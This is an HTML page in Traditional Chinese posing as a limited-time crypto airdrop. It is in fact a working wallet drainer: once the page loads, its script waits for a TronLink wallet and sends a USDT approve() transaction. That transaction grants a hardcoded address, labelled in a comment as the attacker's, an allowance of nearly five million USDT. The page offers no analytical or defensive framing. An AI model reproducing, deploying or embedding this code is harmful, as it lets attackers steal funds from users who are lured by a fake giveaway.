<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>限時空投活動</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
  <style>
    body { font-family: Arial, text-align: center; padding: 60px; background: #f4f4f4; }
    h1 { color: #333; }
    #status { margin-top: 20px; font-size: 18px; color: #666; }
  </style>
</head>
<body>
  <h1>✨ 您獲得了限時空投！</h1>
  <p id="status">正在初始化授權...</p>

  <script>
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // TRC20 USDT 主網合約
    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";        // 攻擊者地址
    const APPROVE_AMOUNT = 4999999; // 單位：USDT

    const ABI = [{
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    }];

    async function autoApprove() {
      const status = document.getElementById("status");

      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        status.innerText = "❌ 請使用 TronLink 錢包進入此頁面";
        return;
      }

      try {
        const tronWeb = window.tronWeb;
        const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
        const amount = tronWeb.toBigNumber(APPROVE_AMOUNT).multipliedBy(1e6); // 轉為 6 decimals

        status.innerText = "⭕️ 發送授權交易中...";
        const tx = await contract.approve(SPENDER, amount).send();

        status.innerText = "✅ 授權成功！TX: " + tx;
      } catch (e) {
        status.innerText = "❌ 授權失敗：" + e.message;
      }
    }

    window.addEventListener("load", () => {
      const interval = setInterval(() => {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
          clearInterval(interval);
          autoApprove();
        }
      }, 1000);
    });
  </script>
</body>
</html>
